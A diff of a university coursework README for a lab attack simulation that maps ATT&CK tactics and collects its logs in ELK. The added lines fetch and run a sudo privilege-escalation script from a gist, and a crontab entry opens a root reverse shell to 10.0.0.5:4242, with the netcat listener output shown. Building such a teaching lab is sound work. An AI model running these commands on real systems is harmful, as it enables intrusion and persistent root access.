@@ -1,5 +1,6 @@
-# ICT3204 - Coursework Assignment 1
+<p align="center"><img width="450" height="350" src="https://user-images.githubusercontent.com/27985157/197839626-a557ecb6-ba39-4927-b588-65aa90b8c50b.png"></p>
 
+# ICT3204 - Coursework Assignment 1
 - To plan and implement a attack simulation utilizing `ATT&CK tactics`, `techniques`
 - To integrate the usage of `Vagrant Scripts` and `Docker Containers`
 - To perform log `collection`, `cleaning` and `visualisation` with the use of the `ELK` stack
@@ -32,15 +33,13 @@ kernelCommandLine = "sysctl.vm.max_map_count=262144"
 ```
 
 ## Architecture
-View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0ba2-476d-b156-56c140aab2bd/edit?viewport_loc=-393%2C-96%2C2219%2C979%2C0_0&invitationId=inv_5979f7e6-9a73-4b7e-b835-07418f9dae9d#)
-
-<img src="https://user-images.githubusercontent.com/1593214/197392810-d5950ac7-472b-47ed-a0f6-2cdf622235cc.png" width="1024">
+![Wide_Infra](https://user-images.githubusercontent.com/1593214/197870622-c65058d1-44c8-49fc-8ea7-bc067e506b0c.png)
 
 <p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
 
-# Usage 
-### Table of Contents
+## Table of Contents
   - [Part 1 - Spinning Up The Infrastructure](#part-1---spinning-up-the-infrastructure)
+    - [WSL2](#wsl2)
     - [Quick Commands](#quick-commands)
   - [Part 2 - Logs, Dashboards and Services](#part-2---logs-dashboards-and-services)
     - [Confluence - Attack Target](#confluence---attack-target)
@@ -51,10 +50,11 @@ View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0b
       - [CVE-2022-26134 - Confluence RCE](#cve-2022-26134---confluence-rce)
     - [Privilege Escalation](#privilege-escalation)
       - [CVE-2021-3156 - Buffer Overflow Root Shell](#cve-2021-3156---buffer-overflow-root-shell)
-      - [K55 Linux Process Injection Utility](#k55-linux-process-injection-utility)
+      - [Abuse Elevation Control Mechanism](#abuse-elevation-control-mechanism)
     - [Persistence](#persistence)
       - [Persistence Using SUID Binaries](#persistence-using-suid-binaries)
       - [Persistence Using Account](#persistence-using-account)
+	  - [Persistence Using Crontab](#persistence-using-crontab)
     - [Credential Access](#credential-access)
       - [DumpsterDiver](#dumpsterdiver)
       - [LaZagne](#lazagne)
@@ -64,6 +64,11 @@ View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0b
       - [Exfiltrate Data Over DNS](#exfiltrate-data-over-dns)
     - [Impact](#impact)
       - [Ransomware Payload](#ransomware-payload)
+  - [Documentation](#documentation)
+    - [YouTube](youtube)
+    - [Poster](poster)
+    - [Kibana Dashboard](kibana-dashboard)
+
 
 ## Part 1 - Spinning Up The Infrastructure
 1. Ensure Docker Engine is **running**
@@ -212,24 +217,17 @@ confluence@confluence:/vagrant/attack/2_PrivilegeEscalation$ ./demo_1_cve.sh
 root@confluence:/tmp/pe/CVE-2021-3156#
 ```
 
-#### K55 Linux Process Injection Utility
-[K55](https://github.com/josh0xA/K55) is a linux payload injection tool that is used for injecting x86_64 shellcode payloads into running processes.
+#### Abuse Elevation Control Mechanism
+The python package installer (PIP) can be used by the confluence user to gain sudo access by running an exploit script that abuses over-privilege.
 
-##### Continuing from Exploited Root Shell (Terminal 1)
-```console
-root@confluence:/tmp/pe/CVE-2021-3156# cd /vagrant/attack/2_PrivilegeEscalation
-root@confluence:/vagrant/attack/2_PrivilegeEscalation# sed -i -e 's/\r$//' demo_2_process_injection.sh
-root@confluence:/vagrant/attack/2_PrivilegeEscalation# ./demo_2_process_injection.sh
-```
-
-##### Running a 2nd Exploited Root Shell (Terminal 2)
+##### Running PIP Exploit
 ```console
 root@confluence:/# su confluence
-confluence@confluence:/$ cd /tmp/pe/CVE-2021-3156
-confluence@confluence:/tmp/pe/CVE-2021-3156$ ./exploit
-root@confluence:/tmp/pe/CVE-2021-3156# cd /vagrant/attack/2_PrivilegeEscalation
-root@confluence:/vagrant/attack/2_PrivilegeEscalation# sed -i -e 's/\r$//' demo_3_process_injection.sh
-root@confluence:/vagrant/attack/2_PrivilegeEscalation# ./demo_3_process_injection.sh
+confluence@confluence:/$ cd /tmp/pe
+confluence@confluence:/tmp/pe$ wget https://gist.githubusercontent.com/kevinnivekkevin/a9c929a632de3ff4c3b03fbbd247c6f2/raw/e740c5d73ff0a8b17ba3b54c2bfebfe102f3f197/sudoers_pe.sh
+confluence@confluence:/tmp/pe$ chmod +x sudoers_pe.sh
+confluence@confluence:/tmp/pe$ ./sudoers_pe.sh
+root@confluence:/#
 ```
 
 #### Automation Script
@@ -237,7 +235,7 @@ root@confluence:/vagrant/attack/2_PrivilegeEscalation# ./demo_3_process_injectio
 HOST-MACHINE@HOST $ vagrant provision --provision-with privesc 
 ```
 ```console
-HOST-MACHINE@HOST $ vagrant provision --provision-with processinjection
+HOST-MACHINE@HOST $ vagrant provision --provision-with sudoerspe
 ```
 
 <p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
@@ -251,7 +249,7 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with processinjection
 ##### Setup
 ```console
 root@confluence:/# cd /tmp
-root@confluence:/tmp# cp /vagrant/attak/persistence/binarysuid /tmp/suid.c
+root@confluence:/tmp# cp /vagrant/attack/persistence/binarysuid /tmp/suid.c
 ```
 ```console
 root@confluence:/tmp# gcc suid.c -o suid
@@ -282,6 +280,24 @@ confluence@confluence:/tmp$ su systemd
 Password: systemd
 # whoami
 whoami
+root
+```
+
+#### Persistence Using Crontab
+- After gaining root access via privilege escalation, create crontab to run /bin/bash every 1 min on port 4242.
+- Allows attacker to regain root privileges by listening to port 4242.
+
+```console
+root@confluence:/tmp# (crontab -l ; echo "* * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
+```
+##### Regain
+```console
+root@kali:/# nc -nvlp 4242
+listening on [any] 4242 ...
+connect to [10.0.0.5] from (UNKNOWN) [10.0.0.3] 35094
+bash: cannot set terminal process group (23962): Inappropriate ioctl for device
+bash: no job control in this shell
+root@confluence:~# whoami
 root
 ```
 
@@ -351,3 +367,12 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with ransom
 ```
 
 <p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
+
+## Documentation
+### YouTube
+
+### Poster
+![poster](https://user-images.githubusercontent.com/27985157/197874389-420581e4-4acb-45b5-a4ee-55999d75a117.png)
+
+### Kibana Dashboard
+![dashboard](https://user-images.githubusercontent.com/27985157/197878639-71d55c56-52d2-40b3-8e3b-46e29f4581e3.png)
